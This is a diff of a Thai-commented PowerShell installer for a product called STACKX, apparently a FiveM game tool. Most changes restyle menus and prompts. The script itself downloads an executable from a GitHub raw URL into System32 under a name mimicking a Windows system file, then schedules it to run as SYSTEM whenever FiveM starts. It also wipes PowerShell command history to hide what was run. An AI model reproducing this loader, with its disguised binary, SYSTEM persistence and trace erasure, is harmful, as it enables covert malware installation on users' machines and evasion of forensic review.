@@ -47,7 +47,7 @@ Start-Sleep -Milliseconds 600
 
 Write-Console "Please enter your STACKX License Key: " "INPUT"
 
-# ใช้ ReadLine() ระดับ Host แทน Read-Host เพื่อแก้บั๊กการข้ามบรรทัดจากคำสั่ง iex
+# ใช้ $Host.UI.ReadLine() แทน Read-Host เพื่อป้องกันการดักสัญญาณ Enter ว่างที่ติดมาจากคำสั่ง iex
 $key = $Host.UI.ReadLine()
 
 if ([string]::IsNullOrWhiteSpace($key)) {
@@ -92,7 +92,7 @@ try {
     Write-Host ""
     Write-Console "ACCESS GRANTED. Welcome to STACKX." "SUCCESS"
     Write-Host ""
-    Write-Host "  Press any key to continue to dashboard..." -ForegroundColor DarkGray
+    Write-Console "Press any key to load dashboard..." "INFO"
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 } catch {
@@ -112,16 +112,23 @@ $destPath = "C:\Windows\System32\$fileName"
 $exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"
 
 while ($true) {
-    Clear-Host
-    Write-Host "1. Install & Persistence"
-    Write-Host "2. Check Status"
-    Write-Host "0. Exit"
-
-    $choice = Read-Host "Select"
+    # แสดงหัวข้อสไตล์ STACKX ในหน้าเมนูหลักด้วย
+    Show-Header
+    
+    Write-Console "1. Install & Persistence" "INFO"
+    Write-Console "2. Check Status" "INFO"
+    Write-Console "0. Exit" "INFO"
+    Write-Host ""
+    
+    # ใช้ $Host.UI.ReadLine() ในเมนูหลักด้วย เพื่อไม่ให้ลูปนี้ไหลอัตโนมัติเมื่อสั่งรันสด
+    Write-Console "Select Option: " "INPUT"
+    $choice = $Host.UI.ReadLine()
 
     if ($choice -eq "1") {
         Clear-Host
-        Write-Host "Installing System..." -ForegroundColor Cyan
+        Show-Header
+        Write-Host "  Installing System..." -ForegroundColor Cyan
+        Write-Host ""
 
         try {
             Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
@@ -131,35 +138,42 @@ while ($true) {
             $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
             schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f
 
-            Write-Host "Install complete!" -ForegroundColor Green
-            Write-Host "SECXIONN will run automatically when FiveM starts." -ForegroundColor Yellow
+            Write-Host ""
+            Write-Console "Install complete!" "SUCCESS"
+            Write-Console "STACKX will run automatically when FiveM starts." "INFO"
             
             Clear-History
             Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
         }
         catch {
-            Write-Host "Install failed!" -ForegroundColor Red
-            Write-Host $_.Exception.Message -ForegroundColor Yellow
+            Write-Host ""
+            Write-Console "Install failed!" "ERROR"
+            Write-Console $_.Exception.Message "INFO"
         }
-        pause
+        Write-Host ""
+        Write-Host "  Press any key to return..." -ForegroundColor DarkGray
+        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
     elseif ($choice -eq "2") {
         Clear-Host
-        Write-Host "--- SYSTEM INFO ---" -ForegroundColor Cyan
+        Show-Header
+        Write-Console "SYSTEM INFORMATION" "INFO"
+        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
+        
         if (Test-Path $destPath) {
-            Write-Host "Status: Ready" -ForegroundColor Green
-            Write-Host "File  : $fileName"
-            Write-Host "Task  : $taskName"
+            Write-Console "Status : Ready" "SUCCESS"
+            Write-Console "File   : $fileName" "INFO"
+            Write-Console "Task   : $taskName" "INFO"
         } else {
-            Write-Host "Status: Not Installed" -ForegroundColor Red
+            Write-Console "Status : Not Installed" "ERROR"
         }
-        pause
+        Write-Host ""
+        Write-Host "  Press any key to return..." -ForegroundColor DarkGray
+        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
-  elseif ($choice -eq "0") {
-        # คำสั่งล้างข้อความในไฟล์ประวัติ (ไฟล์ยังอยู่แต่ข้อมูลข้างในหายหมด)
+    elseif ($choice -eq "0") {
         $p="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
         if(Test-Path $p){ Clear-Content $p -Force }
-        
         exit
     }
 }
